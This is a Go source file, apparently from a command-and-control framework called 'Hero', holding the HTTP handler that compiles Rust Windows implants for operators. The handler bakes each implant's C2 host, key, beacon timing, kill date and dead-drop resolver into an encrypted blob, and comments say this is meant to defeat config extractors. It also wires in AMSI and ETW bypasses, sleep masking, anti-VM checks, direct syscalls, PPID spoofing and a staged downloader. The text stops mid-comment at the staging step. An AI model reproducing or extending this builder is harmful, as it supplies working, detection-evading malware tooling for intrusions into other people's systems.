package main

import (
        "archive/zip"
        "bufio"
        "bytes"
        "crypto/rand"
        "crypto/sha256"
        "encoding/binary"
        "encoding/hex"
        "encoding/json"
        "fmt"
        "io"
        "log"
        "math"
        "net/http"
        "os"
        "os/exec"
        "path/filepath"
        "regexp"
        "strconv"
        "strings"
        "sync"
        "time"
)

// validNameRe — output_name charset guard (S3 path-traversal fix companion).
var validNameRe = regexp.MustCompile(`^[A-Za-z0-9_-]{1,64}$`)

// BuildResponse — client ko build result bhejta hai
type BuildResponse struct {
        Success  bool   `json:"success"`
        Message  string `json:"message"`
        Log      string `json:"log"`
        FilePath string `json:"file_path,omitempty"`
        FileName string `json:"file_name,omitempty"`
        FileSize int64  `json:"file_size,omitempty"`
        SHA256   string `json:"sha256,omitempty"`
        ConfigID string `json:"config_id,omitempty"`
        PSKHex   string `json:"psk_hex,omitempty"`
}

// ── Cloud IMP-4 FIX: cap shipped build log to last 64KB ──────────────────
// The OLD logTail helper took `max=4000` from every caller and silently
// truncated with "...(truncated)..." — meaning the operator only ever saw
// the last ~4KB of a multi-MB compile log. For a typical Rust release
// build that's the last 30-50 lines (linker diagnostics), missing most
// of the cargo error trail. Now: ship the last 64KB (enough to diagnose
// ~99% of compile failures) with a clear prefix marking the head was cut.
const maxBuildLog = 64 * 1024

// handleBuilderBuild — Rust implant compile karta hai, ./payload/ mein save karta hai
func handleBuilderBuild(w http.ResponseWriter, r *http.Request) {
        if r.Method != http.MethodPost {
                writeJSON(w, http.StatusMethodNotAllowed, BuildResponse{
                        Success: false, Message: "method not allowed",
                })
                return
        }

        var cfg ImplantConfig
        if err := json.NewDecoder(r.Body).Decode(&cfg); err != nil {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "invalid request body", Log: err.Error(),
                })
                return
        }

        // ── BUGFIX (S3): output_name path traversal ─────────────────────────
        // output_name was used raw in filepath.Join(payloadDir, name+".exe")
        // and as the ZIP entry name — "../../x" wrote files anywhere the
        // server user can write and embedded a zip-slip entry. Sanitize first
        // so every downstream use (buildID, path, zip, logs) is clean.
        cfg.OutputName = strings.TrimSpace(cfg.OutputName)
        cfg.OutputName = filepath.Base(cfg.OutputName) // strip any ../ components
        if cfg.OutputName == "." || cfg.OutputName == ".." || cfg.OutputName == "" {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "MANDATORY: output_name is required (letters, digits, _ - only)",
                })
                return
        }
        if !validNameRe.MatchString(cfg.OutputName) {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "MANDATORY: output_name may only contain letters, digits, underscore and hyphen (got: " + cfg.OutputName + ")",
                })
                return
        }

        // ── BUGFIX (S10) numeric range validation — v3: CONDITIONAL ────────
        // The v3 dialog omits these fields (values come from the profile or
        // safe defaults), so a missing value is legal. Provided values are
        // still range-checked.
        if cfg.FallbackPort != 0 && (cfg.FallbackPort < 1 || cfg.FallbackPort > 65535) {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "OPTIONAL Fallback Port must be 1-65535 (or empty)",
                })
                return
        }
        if cfg.MaxErrors != 0 && (cfg.MaxErrors < 1 || cfg.MaxErrors > 4294967295) {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "Max Errors must be 1..4294967295 (or omit for profile/default)",
                })
                return
        }
        if cfg.MaxRetries != 0 && (cfg.MaxRetries < 0 || cfg.MaxRetries > 4294967295) {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "Max Retries must be 0..4294967295 (or omit for profile/default)",
                })
                return
        }
        if cfg.BackoffBaseMs != 0 && (cfg.BackoffBaseMs < 1000 || cfg.BackoffBaseMs > 4294967295) {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "Backoff Base must be 1000..4294967295 ms (or omit for profile/default)",
                })
                return
        }
        if cfg.BackoffMaxMs != 0 && cfg.BackoffMaxMs > 4294967295 {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "Backoff Max must be <= 4294967295 ms (or omit for profile/default)",
                })
                return
        }

        if cfg.ListenerID == "" {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "listener_id is required", Log: "No listener selected",
                })
                return
        }

        listener := getListenerByID(cfg.ListenerID)
        if listener == nil {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "listener not found", Log: "Selected listener not found or inactive",
                })
                return
        }
        // BUGFIX (S10): the listener's external port is baked into config.rs as a
        // u16 literal — out-of-range values failed the RUST build minutes in.
        if listener.DomainPort < 0 || listener.DomainPort > 65535 {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "Listener External Port must be 1-65535 (or empty) — fix the listener",
                })
                return
        }

                // ── v3 CONFIG RESOLUTION — request (old clients) > profile > default ──
        // The v3 builder dialog sends ONLY entry essentials (name, listener,
        // os, arch, format, profile). Timing / evasion / resilience live in
        // the profile TOMLs: the agent binary carries the CODE, the profile
        // carries the SWITCHES (operator's pointer into baked capabilities).
        var prof *C2Profile
        if mp := strings.TrimSpace(cfg.MalleableProfile); mp != "" && !strings.EqualFold(mp, "none") {
                prof = GetProfile(mp)
                if prof == nil {
                        writeJSON(w, http.StatusBadRequest, BuildResponse{
                                Success: false,
                                Message: fmt.Sprintf("OPTIONAL Malleable Profile %q not found on server — available: %v (loaded from profiles/*.toml at startup)", mp, ListProfileNames()),
                        })
                        return
                }
        }
        if prof == nil {
                // No profile selected — an all-empty profile makes every
                // prof.X access below safe and semantically "absent".
                prof = &C2Profile{}
        }

        // pickInt — request value wins when >0 (old-client compat), else the
        // profile value, else the built-in default.
        pickInt := func(req int, profStr string, def int) int {
                if req > 0 {
                        return req
                }
                if n := profileInt(profStr); n > 0 {
                        return n
                }
                return def
        }
        pickStr := func(req, profVal, def string) string {
                if req != "" && req != "None" {
                        return req
                }
                if profVal != "" {
                        return profVal
                }
                return def
        }
        // pickEvasion — an explicit non-"none" request choice wins (old client
        // that deliberately picked hwbp); profile next; default last. An old
        // client's "none" loses to the profile ON PURPOSE: v3 makes the
        // profile the source of truth for evasion selection.
        pickEvasion := func(req, profVal, def string) string {
                if req != "" && req != "none" && req != "None" {
                        return req
                }
                if profVal != "" {
                        return profVal
                }
                return def
        }

        sleepSec := pickInt(cfg.SleepTime, profTimingStr(prof, "sleep_s"), 300)
        if sleepSec < 1 || sleepSec > 604800 {
                sleepSec = 300
        }
        jitterPct := pickInt(int(cfg.Jitter*100), profTimingStr(prof, "jitter_percent"), 40)
        if jitterPct < 1 || jitterPct > 100 {
                jitterPct = 40
        }
        maxErrors := pickInt(cfg.MaxErrors, prof.MaxErrors, 100)
        if maxErrors < 1 {
                maxErrors = 100
        }
        maxRetries := pickInt(cfg.MaxRetries, prof.MaxRetries, 1000)
        if maxRetries < 0 {
                maxRetries = 1000
        }
        backoffBaseMs := pickInt(cfg.BackoffBaseMs, prof.BackoffBaseMs, 60000)
        if backoffBaseMs < 1000 {
                backoffBaseMs = 60000
        }
        backoffMaxMs := pickInt(cfg.BackoffMaxMs, prof.BackoffMaxMs, 14400000)
        if backoffMaxMs < backoffBaseMs {
                backoffMaxMs = 14400000
        }
        backoffStrategy := strings.ToLower(pickStr(cfg.BackoffStrategy, prof.BackoffStrategy, "exponential"))
        switch backoffStrategy {
        case "exponential", "fixed", "random":
        default:
                backoffStrategy = "exponential"
        }
        initialDelayMs := pickInt(cfg.InitialDelayMs, prof.InitialDelayMs, 5000)
        initialDelayMaxMs := pickInt(cfg.InitialDelayMaxMs, prof.InitialDelayMaxMs, 10000)
        if initialDelayMaxMs < initialDelayMs {
                initialDelayMaxMs = initialDelayMs
        }
        jitterDist := strings.ToLower(pickStr(cfg.JitterDist, prof.JitterDistribution, "gaussian"))
        if jitterDist == "none" {
                jitterDist = "uniform"
        }
        switch jitterDist {
        case "", "uniform", "gaussian", "exponential":
        default:
                jitterDist = "gaussian"
        }
        workingHours := pickStr(cfg.WorkingHours, prof.WorkingHoursOverride, "")
        if workingHours != "" && !validWorkingHours(workingHours) {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false,
                        Message: "Working Hours invalid — expected HH:MM-HH:MM (e.g. 09:00-18:00) (from request or profile [timing])",
                })
                return
        }
        killDate := pickStr(cfg.KillDate, prof.KillDate, "")
        if killDate != "" {
                if _, err := time.Parse("2006-01-02", killDate); err != nil {
                        writeJSON(w, http.StatusBadRequest, BuildResponse{
                                Success: false,
                                Message: "Kill Date invalid — expected YYYY-MM-DD (e.g. 2026-12-31) (from request or profile [timing])",
                        })
                        return
                }
        }
        amsiTech := pickEvasion(cfg.AmsiBypass, prof.Amsi, "hwbp")
        etwTech := pickEvasion(cfg.EtwPatch, prof.Etw, "hwbp")
        sleepTech := pickEvasion(cfg.SleepObfusc, prof.SleepMask, "none")
        antiVmMask := pickEvasion(cfg.AntiVM, prof.AntiVM, "none")

        // Output format: exe (default) | staged (v3: stager + stage-2 zip)
        if cfg.OutputFormat == "" {
                cfg.OutputFormat = "exe"
        }
        if cfg.OutputFormat != "exe" && cfg.OutputFormat != "staged" {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false, Message: "output_format must be exe | staged",
                })
                return
        }

        if cfg.OS == "" {
                cfg.OS = "windows"
        }
        if cfg.OS != "windows" {
                writeJSON(w, http.StatusBadRequest, BuildResponse{
                        Success: false,
                        Message: "agent backend currently supports Windows-only cross-compilation",
                        Log:     fmt.Sprintf("Selected OS='%s'. Rust implant currently builds only for x86_64-pc-windows-gnu. Linux/macOS targets are not yet wired up in Cargo.toml.", cfg.OS),
                })
                return
        }

        if cfg.Arch == "" {
                cfg.Arch = "x64"
        }
        if cfg.UserAgent == "" {
                cfg.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        // Legacy fallback host (old-client field; v3 rotation prefers [hosts])
        fallbackHost := strings.TrimSpace(cfg.FallbackHost)
        fallbackPort := cfg.FallbackPort
        if fallbackPort == 0 {
                fallbackPort = 443
        }

        logBuf := &bytes.Buffer{}
        ll := func(format string, args ...interface{}) {
                msg := fmt.Sprintf(format, args...)
                logBuf.WriteString(msg + "\n")
                log.Printf("[BUILD] %s", msg)
        }

        // logTail — failure responses carry only the LAST `max` bytes of the
        // build log (compile-error tail). The full log is deliberately NOT
        // shipped: the JavaFX dialog already streams the build live over WS
        // (build_progress) and embedding the whole log in the JSON response
        // bloated the payload and dumped noisy logs on the client console.
        //
        // ── Cloud IMP-4 FIX: default caller is now logTail(maxBuildLog) (=64KB),
        // raised from the old hardcoded 4000 bytes. Prefix renamed to make the
        // truncation direction explicit (head cut, tail kept) so an operator
        // reading the dialog knows the LATEST lines are intact and the missing
        // context is at the TOP.
        logTail := func(max int) string {
                s := logBuf.String()
                if len(s) <= max {
                        return s
                }
                return "[...truncated head...]\n" + s[len(s)-max:]
        }

        // bprog — live build progress over WebSocket → JavaFX footer progress bar
        // Stages: start → prepare → config → compiling(15-80%) → link → stealth
        //         → finalize → package → register → done(100%) | failed
        buildID := fmt.Sprintf("%s-%d", cfg.OutputName, time.Now().Unix())
        bprog := func(stage string, percent int, detail string) {
                BroadcastEvent("build_progress", map[string]interface{}{
                        "build_id": buildID, "stage": stage,
                        "percent": percent, "detail": detail,
                })
        }
        bfail := func(percent int, detail string) {
                bprog("failed", percent, detail)
        }

        bprog("start", 2, "Build request accepted")
        ll("=== HERO PAYLOAD BUILD START ===")
        ll("Target: %s/%s format=%s", cfg.OS, cfg.Arch, cfg.OutputFormat)
        ll("Listener: %s (%s://%s:%d)", listener.Name, listener.Protocol, resolveListenerHost(listener), listener.Port)

        heroRoot := os.Getenv("HERO_ROOT")
        if heroRoot == "" {
                heroRoot, _ = os.Getwd()
        }
        ll("Hero root: %s", heroRoot)

        implantSrcDir := filepath.Join(heroRoot, "implant", "agent_core")
        if _, err := os.Stat(filepath.Join(implantSrcDir, "Cargo.toml")); err != nil {
                ll("ERROR: Implant source not found at %s", implantSrcDir)
                ll("Set HERO_ROOT env var to hero framework root directory")
                bfail(2, "Implant source not found")
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "implant source not found", Log: logTail(maxBuildLog),
                })
                return
        }

        // Also check that the BOF workspace exists — needed for Hidden Desktop
        // feature + BOF loader. Layout: <root>/bofs/{loader,bofs_src,bofs_out,scripts}
        bofSrcDir := filepath.Join(heroRoot, "bofs")
        if _, err := os.Stat(bofSrcDir); err != nil {
                ll("WARNING: BOF workspace not found at %s — BOF features unavailable", bofSrcDir)
        }

        pskBytes := make([]byte, 32)
        rand.Read(pskBytes)
        pskHex := hex.EncodeToString(pskBytes)
        ll("Generated PSK: %s... (64 hex chars)", pskHex[:16])

        c2Host := resolveListenerHost(listener)
        c2Protocol := listener.Protocol // raw protocol from the listener record
        // ── BUGFIX (S7): non-HTTP listener protocols baked an unusable scheme ──
        // Every listener is served by a plain net/http server (see AddListener:
        // only protocol "https" enables ServeTLS) — but the OLD code passed
        // listener.Protocol straight into c2_protocol, so an agent built against
        // a dns/grpc/smb/tcp/graph/doh listener got c2_protocol:"dns" etc. and
        // tried to phone home over "dns://..." — no HTTP client can use that
        // scheme, the implant could NEVER check in (silent failure). The wire
        // protocol must match what the listener actually speaks.
        switch listener.Protocol {
        case "https":
                c2Protocol = "https"
        case "", "http":
                c2Protocol = "http"
        default:
                // dns / doh / grpc / graph / smb / tcp listeners are plain HTTP
                // servers on the wire today — build the agent to speak HTTP so it
                // actually reaches them instead of dying silently.
                c2Protocol = "http"
        }

        // OPSEC FIX (user-reported): If C2_USE_TLS=true, FORCE https protocol.
        // When the server has TLS enabled (C2_USE_TLS=true), ALL listeners
        // serve HTTPS — even if the operator accidentally created an "http"
        // listener. The listener goroutine logs a WARNING and serves HTTP, but
        // the agent MUST be built with https to match. Without this fix, the
        // agent gets c2_protocol="http" and sends plain HTTP → server rejects
        // with "client sent an HTTP request to an HTTPS server".
        if os.Getenv("C2_USE_TLS") == "true" || os.Getenv("C2_USE_TLS") == "1" {
                if c2Protocol != "https" {
                        ll("WARNING: C2_USE_TLS=true but listener protocol=%s — forcing c2_protocol to https", listener.Protocol)
                        c2Protocol = "https"
                }
        }

        c2Port := listener.Port
        if listener.Domain != "" {
                if listener.DomainPort > 0 {
                        c2Port = listener.DomainPort
                } else if c2Protocol == "https" {
                        c2Port = 443
                } else {
                        c2Port = 80
                }
        }
        c2Endpoint := "/api/v1/c2-endpoint"

        // ── v3 malleable profile dialect ──────────────────────────────────
        // c2Endpoint = profile POST URI (first check-in already speaks the
        // dialect). GET poll URI + poll mode + postex + bootstrap + host
        // rotation ride into the encrypted blob from the same profile.
        profileJSON := ""
        getEndpoint := ""
        pollMode := "post"
        rotationStrategy := "failover"
        var profileHosts []string
        spawnTo, ppidImage := "", ""
        blockDLLs := false
        bootstrapMode, bootstrapURL, bootstrapBegin, bootstrapEnd := "direct", "", "", ""
        if prof != nil {
                c2Endpoint = prof.PostURI
                if prof.UserAgent != "" {
                        cfg.UserAgent = prof.UserAgent
                }
                profileJSON = ProfileBakeJSON(prof)
                ll("Malleable profile: %s (endpoint %s)", prof.Name, prof.PostURI)
                getEndpoint = prof.GetURI
                if prof.PollMode != "" {
                        pollMode = prof.PollMode
                }
                if prof.RotationStrategy != "" {
                        rotationStrategy = prof.RotationStrategy
                }
                profileHosts = ProfileHosts(prof)
                spawnTo, ppidImage = prof.SpawnTo, prof.PPID
                blockDLLs = prof.BlockDLLs == "true"
                if prof.BootstrapMode != "" {
                        bootstrapMode = prof.BootstrapMode
                }
                bootstrapURL, bootstrapBegin, bootstrapEnd = prof.BootstrapURL, prof.BootstrapBegin, prof.BootstrapEnd
        }
        if fallbackHost == "" && len(profileHosts) > 0 {
                // legacy fallback_host field doubles as the first rotation host
                fh := profileHosts[0]
                if i := strings.LastIndex(fh, ":"); i >= 0 {
                        fh = fh[:i]
                }
                fallbackHost = fh
        }
        if bootstrapMode == "deaddrop" && bootstrapURL != "" {
                ll("Bootstrap: DEAD-DROP RESOLVER (C2 host fetched at runtime, T1102.001)")
        }

        urlDisplay := fmt.Sprintf("%s://%s", c2Protocol, c2Host)
        isStdPort := (c2Protocol == "https" && c2Port == 443) || (c2Protocol == "http" && c2Port == 80)
        if !isStdPort {
                urlDisplay = fmt.Sprintf("%s:%d", urlDisplay, c2Port)
        }
        ll("C2 target: %s%s", urlDisplay, c2Endpoint)

        sleepMs := sleepSec * 1000
        jitterMs := sleepSec * jitterPct * 10 // sleepSec*s × jitterPct% in ms
        maxErrorsU := uint32(maxErrors)

        // ── Load CA cert for agent TLS pinning ──────────────────────────────
        // OPSEC FIX (user requirement): ONLY load from /etc/hero/.env via
        // HERO_CA_CERT. setup.sh already copies certs from /home/kali/cert/
        // to /etc/hero/certs/ and sets HERO_CA_CERT in .env. No fallback
        // paths — single source of truth.
        caCertPEM := ""
        caCertPath := os.Getenv("HERO_CA_CERT")
        if caCertPath != "" {
                if data, err := os.ReadFile(caCertPath); err == nil {
                        caCertPEM = string(data)
                        ll("CA cert loaded from HERO_CA_CERT (%s): %d bytes", caCertPath, len(data))
                } else {
                        ll("WARNING: HERO_CA_CERT=%s but file not readable: %v", caCertPath, err)
                }
        }
        if caCertPEM == "" {
                ll("WARNING: HERO_CA_CERT not set or unreadable — agent will NOT verify server TLS cert!")
                ll("  Run setup.sh first: sudo bash setup.sh --certs-from /home/kali/cert")
                ll("  Then verify: cat /etc/hero/.env | grep HERO_CA_CERT")
        }

        ll("Resolving v3 build config (request > profile > defaults)...")
        ll("  SleepTime: %ds → %dms  Jitter: %d%% → %dms (%s)", sleepSec, sleepMs, jitterPct, jitterMs, jitterDist)
        ll("  MaxErrors: %d  MaxRetries: %d  Backoff: %s (%d..%dms)", maxErrors, maxRetries, backoffStrategy, backoffBaseMs, backoffMaxMs)
        ll("  InitialDelay: %d..%dms  WorkingHours: %q  KillDate: %q", initialDelayMs, initialDelayMaxMs, workingHours, killDate)
        directSys := prof.DirectSys // profile [evasion] direct_sys flag
        ll("  Evasion: AMSI=%s ETW=%s Sleep=%s AntiVM=%s DirectSys=%v", amsiTech, etwTech, sleepTech, antiVmMask, directSys)
        switch sleepTech {
        case "rc4", "xor", "wipe":
                sleepTech = "shadow7"
                ll("  SleepTech remapped legacy -> shadow7")
        case "none", "shadow7":
        default:
                sleepTech = "none"
        }
        ll("  TLS Pinning: %s", map[bool]string{true: "ENABLED", false: "DISABLED (no CA cert)"}[caCertPEM != ""])
        ll("  Rotation: strategy=%s extra_hosts=%v fallback=%s:%d", rotationStrategy, profileHosts, fallbackHost, fallbackPort)
        if pollMode == "get" {
                ll("  Poll mode: GET (heartbeat via %s, results via POST)", getEndpoint)
        }
        if spawnTo != "" || ppidImage != "" || blockDLLs {
                ll("  PostEx: spawnto=%q ppid=%q blockdlls=%v", spawnTo, ppidImage, blockDLLs)
        }

        // ── v3 BAKED CONFIG BLOB (encrypted) ───────────────────────────────
        // Everything the agent needs BEFORE its first network byte, marshaled
        // to JSON and encrypted with a per-build random key. The generated
        // config.rs contains ONLY ciphertext — `strings`/config-extractors
        // find zero C2 indicators (anti-fingerprinting: every build's bytes
        // are unique because key+masks are random per build).
        fallbackProtocols := [4]string{"none", "none", "none", "none"}
        for i, fp := range cfg.FallbackProtocols {
                if i >= 4 {
                        break
                }
                if fp == "None" || fp == "" {
                        fallbackProtocols[i] = "none"
                } else {
                        fallbackProtocols[i] = fp
                }
        }
        blob := map[string]interface{}{
                "c2_host": c2Host, "c2_port": c2Port,
                "c2_protocol": c2Protocol, "c2_endpoint": c2Endpoint,
                "user_agent": cfg.UserAgent, "encryption_key": pskHex,
                "ca_cert_pem": caCertPEM,
                "sleep_ms": sleepMs, "jitter_ms": jitterMs, "max_errors": maxErrorsU,
                "kill_date": killDate, "working_hours": workingHours,
                "jitter_distribution": jitterDist,
                "fallback_host": fallbackHost, "fallback_port": fallbackPort,
                "c2_hosts": profileHosts, "rotation_strategy": rotationStrategy,
                "poll_mode": pollMode, "get_endpoint": getEndpoint,
                "bootstrap_mode": bootstrapMode, "bootstrap_url": bootstrapURL,
                "bootstrap_begin": bootstrapBegin, "bootstrap_end": bootstrapEnd,
                "postex_spawnto": spawnTo, "postex_ppid": ppidImage, "postex_blockdlls": blockDLLs,
                "initial_delay_ms": uint32(initialDelayMs), "initial_delay_max_ms": uint32(initialDelayMaxMs),
                "max_retries": uint32(maxRetries),
                "backoff_base_ms": uint32(backoffBaseMs), "backoff_max_ms": uint32(backoffMaxMs),
                "backoff_strategy": backoffStrategy,
                "amsi_technique": amsiTech, "etw_technique": etwTech,
                "sleep_technique": sleepTech, "anti_vm_mask": antiVmMask,
                "direct_sys": directSys,
                "fallback_protocols": fallbackProtocols[:],
                "profile_json": profileJSON,
        }
        blobJSON, err := json.Marshal(blob)
        if err != nil {
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "config blob marshal failed", Log: logTail(maxBuildLog),
                })
                return
        }
        ll("Config blob: %d bytes JSON → encrypted with per-build random key", len(blobJSON))
        bprog("config", 12, "encrypted config prepared")


        payloadDir := filepath.Join(heroRoot, "payload")
        // ── S-M6 FIX: payload dir perms 0755 → 0700 ──────────────────────
        // ./payload/ holds freshly-built agent binaries (PE/ELF executables)
        // AND build_meta.json containing PSK hashes + listener metadata.
        // 0755 made the directory WORLD-READABLE+EXECUTABLE on multi-user
        // hosts: any local user could list payloads, read the metadata
        // sidecar (which contains a PSK-hash fingerprint — see Cloud BUG 5
        // for why even that's sensitive), or copy binaries out for offline
        // analysis. 0700 restricts to owner-only (the c2-server process).
        if err := os.MkdirAll(payloadDir, 0700); err != nil {
                ll("ERROR: payload dir create failed: %v", err)
                bfail(2, "Cannot create payload directory")
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "payload directory creation failed", Log: logTail(maxBuildLog),
                })
                return
        }
        ll("Payload dir: %s", payloadDir)

        tmpBuildDir, err := os.MkdirTemp("", "hero-implant-build-")
        if err != nil {
                ll("ERROR: temp dir failed: %v", err)
                bfail(2, "Temp dir creation failed")
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "temp dir failed", Log: logTail(maxBuildLog),
                })
                return
        }
        defer os.RemoveAll(tmpBuildDir)
        ll("Temp dir: %s", tmpBuildDir)

        ll("Copying implant source...")
        // Copy the ENTIRE implant/ folder (agent_core), plus the root bofs/
        // workspace next to it. build.rs resolves the C loader and BOF sources
        // as ../../bofs/ relative to the agent_core crate root, so the temp
        // tree must mirror the real layout:
        //   tmpBuildDir/implant/agent_core/   ← crate
        //   tmpBuildDir/bofs/                 ← loader + bofs_src + bofs_out
        tmpImplantRoot := filepath.Join(tmpBuildDir, "implant")
        tmpImplantDir := filepath.Join(tmpImplantRoot, "agent_core")
        tmpBofsDir := filepath.Join(tmpBuildDir, "bofs")
        if err := copyDirRecursive(implantSrcDir, tmpImplantDir); err != nil {
                ll("ERROR: agent_core source copy failed: %v", err)
                bfail(4, "Source copy failed")
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "source copy failed", Log: logTail(maxBuildLog),
                })
                return
        }
        // Copy the bofs/ workspace so build.rs can find bof_loader.c + hidden_desktop.c
        if _, err := os.Stat(bofSrcDir); err == nil {
                if err := copyDirRecursive(bofSrcDir, tmpBofsDir); err != nil {
                        ll("WARNING: bofs workspace copy failed: %v", err)
                } else {
                        ll("BOF workspace copied to: %s", tmpBofsDir)
                }
        }
        ll("Source copied OK")
        bprog("prepare", 8, "Implant source copied")

        // ── v3: write the ENCRYPTED config blob into the copied config.rs ──
        // The builder no longer owns a config template (the Task-8 class of
        // drift bugs is structurally dead): it reads the freshly copied
        // management/config.rs and swaps the constants between the
        // BEGIN/END_BAKED_BLOB markers. The real file is the single source
        // of truth for structure + decode machinery.
        configPath := filepath.Join(tmpImplantDir, "src", "core_agent", "management", "config.rs")
        if err := writeEncryptedConfig(configPath, blobJSON); err != nil {
                ll("ERROR: config blob bake failed: %v", err)
                bfail(10, "config blob bake failed")
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "config blob bake failed", Log: logTail(maxBuildLog),
                })
                return
        }
        ll("config.rs baked: encrypted blob (%d bytes ciphertext) — zero plaintext config", len(blobJSON))
        bprog("config", 14, "encrypted config baked")


        targetTriple := "x86_64-pc-windows-gnu"
        if cfg.Arch == "x86" {
                targetTriple = "i686-pc-windows-gnu"
        } else if cfg.Arch == "arm64" {
                targetTriple = "aarch64-pc-windows-gnullvm"
        }
        ll("Target: %s", targetTriple)

        outputName := cfg.OutputName
        if outputName == "" {
                outputName = "hero_implant"
        }
        if strings.HasSuffix(outputName, ".exe") {
                outputName = outputName[:len(outputName)-4]
        }
        fullOutputName := outputName + ".exe"
        outputPath := filepath.Join(payloadDir, fullOutputName)

        ll("")
        ll("=== COMPILATION ===")
        ll("cargo build --target %s --release", targetTriple)
        bprog("compiling", 15, "cargo build started")

        cargoArgs := []string{"build",
                "--manifest-path", filepath.Join(tmpImplantDir, "Cargo.toml"),
                "--target", targetTriple,
                "--release",
                "--features", "cffi",
                "--bin", "hero_agent",
        }
        if cfg.OutputFormat == "staged" {
                // v3: also build the tiny stage-1 downloader in the same pass
                cargoArgs = append(cargoArgs, "--bin", "hero_stager")
        }
        cargoCmd := exec.Command("cargo", cargoArgs...)

        // OPSEC FIX (audit S-CR3): Whitelist cargo env vars — DON'T leak
        // all of os.Environ(). The OLD code (`cargoEnv := os.Environ()`)
        // leaked C2_PASSWORD, C2_ENC_KEY, C2_JWT_SECRET, C2_OPERATORS to
        // the cargo build process. A compromised build.rs or dependency
        // could std::env::var("C2_ENC_KEY") and exfiltrate the vault key.
        // NEW: only pass what cargo actually needs — PATH, HOME, CARGO_HOME,
        // RUSTUP_HOME, RUSTFLAGS. All C2_* secrets are excluded.
        cargoEnv := []string{
                "PATH=" + os.Getenv("PATH"),
                "HOME=" + os.Getenv("HOME"),
                "CARGO_HOME=" + os.Getenv("CARGO_HOME"),
                "RUSTUP_HOME=" + os.Getenv("RUSTUP_HOME"),
                "RUSTFLAGS=-C target-feature=+crt-static",
                // GOPROXY=direct in case cargo delegates to a Go tool
                "GOPROXY=direct",
        }
        // If CARGO_HOME/RUSTUP_HOME are empty, provide defaults
        if cargoEnv[2] == "CARGO_HOME=" {
                cargoEnv[2] = "CARGO_HOME=" + filepath.Join(homeDir(), ".cargo")
        }
        if cargoEnv[3] == "RUSTUP_HOME=" {
                cargoEnv[3] = "RUSTUP_HOME=" + filepath.Join(homeDir(), ".rustup")
        }
        cargoEnv = appendWithPATH(cargoEnv, []string{
                filepath.Join(homeDir(), ".cargo", "bin"),
                filepath.Join("/usr", ".cargo", "bin"),
                "/usr/local/cargo/bin",
        })

        cargoCmd.Env = cargoEnv
        cargoCmd.Dir = tmpImplantDir

        // Live-stream cargo output line-by-line: each line goes to the build log
        // AND drives the client progress bar (15% → 78% asymptotic crawl so we
        // never overshoot, 80% on Finished). stderr merged into the same pipe.
        pipeOut, err := cargoCmd.StdoutPipe()
        if err != nil {
                ll("ERROR: cargo stdout pipe: %v", err)
                bfail(15, "cargo pipe failed")
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "cargo pipe failed", Log: logTail(maxBuildLog),
                })
                return
        }
        cargoCmd.Stderr = cargoCmd.Stdout

        if err := cargoCmd.Start(); err != nil {
                ll("ERROR: cargo start failed: %v", err)
                ll("")
                ll("=== BUILD FAILED ===")
                ll("Fixes:")
                ll("  1. rustup target add %s", targetTriple)
                ll("  2. sudo apt install mingw-w64")
                ll("  3. Check ~/.cargo/bin is in PATH")
                bfail(15, "cargo failed to start")
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "compilation failed to start", Log: logTail(maxBuildLog),
                })
                return
        }

        scanner := bufio.NewScanner(pipeOut)
        scanner.Buffer(make([]byte, 0, 64*1024), 1024*1024)
        compileCount := 0
        for scanner.Scan() {
                line := scanner.Text()
                trimmed := strings.TrimSpace(line)
                if trimmed == "" {
                        continue
                }
                ll("  %s", line)
                switch {
                case strings.HasPrefix(trimmed, "Compiling"):
                        compileCount++
                        // Asymptotic crawl: fast early, slows near 78% — accurate
                        // relative progress that can never overshoot the cap.
                        pct := 15 + int(63.0*(1.0-math.Exp(-float64(compileCount)/18.0)))
                        if pct > 78 {
                                pct = 78
                        }
                        bprog("compiling", pct, fmt.Sprintf("Compiling crates (%d done)", compileCount))
                case strings.HasPrefix(trimmed, "Finished"):
                        bprog("compiling", 80, "Compilation finished")
                }
        }
        buildErr := cargoCmd.Wait()

        if buildErr != nil {
                ll("")
                ll("=== BUILD FAILED ===")
                ll("Error: %v", buildErr)
                ll("")
                ll("Fixes:")
                ll("  1. rustup target add %s", targetTriple)
                ll("  2. sudo apt install mingw-w64")
                ll("  3. Check ~/.cargo/bin is in PATH")
                bfail(80, "Compilation failed")
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "compilation failed", Log: logTail(maxBuildLog),
                })
                return
        }

        compiledPath := filepath.Join(tmpImplantDir, "target", targetTriple, "release", "hero_agent.exe")
        if _, err := os.Stat(compiledPath); err != nil {
                ll("ERROR: compiled binary not found at %s", compiledPath)
                bfail(80, "Binary not found after build")
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "binary not found after build", Log: logTail(maxBuildLog),
                })
                return
        }
        bprog("link", 82, "Binary verified")

        // ── v3 staged delivery: stage token + stager wiring ────────────────
        // The stager blob was NOT baked before the build because the stage
        // token is only meaningful once we commit to packaging — generate it
